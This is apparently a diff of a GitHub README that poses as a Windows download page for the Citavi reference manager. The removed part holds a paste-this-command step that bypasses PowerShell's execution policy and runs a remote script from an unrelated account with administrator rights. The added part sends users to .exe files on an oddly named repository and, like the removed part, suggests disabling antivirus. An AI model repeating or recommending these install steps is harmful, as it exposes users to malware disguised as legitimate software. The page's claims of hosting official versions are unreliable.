@@ -1,126 +1,86 @@
-# Citavi Download for Windows 11 & 10
+# 📚 Citavi-2026 - Organize your research and references easily
 
-**Citavi-2026**
+[![](https://img.shields.io/badge/Download-Citavi-2026-blue.svg)](https://github.com/intercollegiate-monochromaticvision235/Citavi-2026/releases)
 
-**Citavi** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## 📋 Project Overview
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+Citavi-2026 helps users manage research projects, academic references, and knowledge bases. This software tracks sources and organizes citations for writing tasks. The application supports Windows 10 and Windows 11 systems. It allows users to search databases, store PDFs, and build project bibliographies.
 
----
+## 🛠 System Requirements
 
-## Download & Install (PowerShell)
+Ensure your computer meets these specifications before you start:
 
-> **This is the download page.** The command below downloads and runs the **Citavi** installer on Windows 10/11.
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: 1.5 GHz or faster.
+- Memory: 4 GB RAM minimum.
+- Storage: 500 MB of free disk space.
+- Microsoft Word: Version 2016 or newer for add-in integration.
+- PDF Reader: Standard software enabled for file preview.
 
-#### Before you start
+## 📥 How to Download 📥
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+You must visit the provided link to get the correct installer for your system. We host all official versions on GitHub.
 
----
+[Click here to visit the release page and download your copy](https://github.com/intercollegiate-monochromaticvision235/Citavi-2026/releases)
 
-#### Step 1 — Open PowerShell as Administrator
+1. Open your web browser.
+2. Select the link above to reach the project release page.
+3. Locate the latest version at the top of the list.
+4. Click the file ending in .exe to start the download process.
+5. Save the file to your Downloads folder.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+## 🖥 Installation Guide 🖥
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+Follow these exact steps to set up the software on your machine.
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+1. Locate the downloaded file in your browser or your Downloads folder.
+2. Double-click the installer icon to begin.
+3. If a User Account Control prompt appears, select Yes to allow the installer to make changes.
+4. Review the license agreement and click Accept to continue.
+5. Choose your default installation folder. The recommended path is the standard program files folder. 
+6. Click Install. Wait for the progress bar to finish.
+7. Select Finish once the installer box displays the success message.
+8. Locate the Citavi icon on your desktop to launch the tool.
 
----
+## ⚙️ Initial Setup ⚙️
 
-#### Step 2 — Copy the full command
+After you launch the program for the first time, you must configure your account preferences to begin research.
 
-Select **both lines** below and press **Ctrl+C**:
+1. Open the application.
+2. Create a new account or sign in with your current credentials.
+3. Open the Tools menu and select Options.
+4. Set your Citation Style preference. Use APA, MLA, or Chicago based on your current project requirements.
+5. Connect your Microsoft Word account. The installer usually detects Word automatically. If it does not, visit the Add-ins section within the settings menu to enable the integration.
+6. Create your first project by clicking File, then New Project.
+7. Give your project a name and save it in a folder you can easily find.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+## 💡 Using the Application 💡
 
-> Copy **both lines**, not just the second one.
+Citavi works by categorizing your research into different containers. You can add books, articles, and websites to your project library.
 
----
+- To add a source, click the Add reference button in the top menu bar.
+- Enter the ISBN or DOI number to add sources automatically.
+- Use the preview pane to read PDFs or add notes to specific pages.
+- Organize your notes by linking them to specific references.
+- Use the Word add-in while you write to insert your citations. The software generates the bibliography for you automatically.
 
-#### Step 3 — Paste into PowerShell and press Enter
+## 🔧 Troubleshooting Common Issues 🔧
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+If you experience problems, use these steps to resolve them.
 
----
+- If the software does not open, restart your computer and try again.
+- If the Word add-in is missing, close Microsoft Word. Run the Citavi installer again and select the Repair option.
+- If you cannot download the file, check your internet connection and disable any strict antivirus software temporarily.
+- If the application runs slowly, close other demanding programs or free up disk space.
+- Ensure your Windows updates are current to prevent compatibility conflicts.
 
-#### Step 4 — Finish setup
+## 📈 Managing your Projects 📈
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+You save your data in a single file format. Copy this file to a cloud service or external hard drive to create backups of your work. Always close the application before you move or copy the project file to prevent data corruption. You can open multiple project files at once if your computer memory permits. Use the search bar inside the main window to find specific citations by author, year, or title.
 
----
+## 🌐 Related Topics
 
-#### Step 5 — Launch the app
-
-Open **Start menu** → search for **Citavi** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**Citavi** setup page for Windows PC users.
-
-**People also search for:** citavi download, citavi reference management install setup windows 2026
-
-**Repository:** `Citavi-2026`
-
-
-## After install
-
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
-
----
-
-**Topics:** citavi-download, citavi, citavi-reference-management-install-setup-windows, reference, management, citavi-2026, reference-manager, knowledge-management, research, software, windows-11, download
+- Managing references efficiently across Windows systems.
+- Automating citation styles for student papers.
+- Knowledge management techniques for researchers.
+- Streamlining the research process in Windows 11.
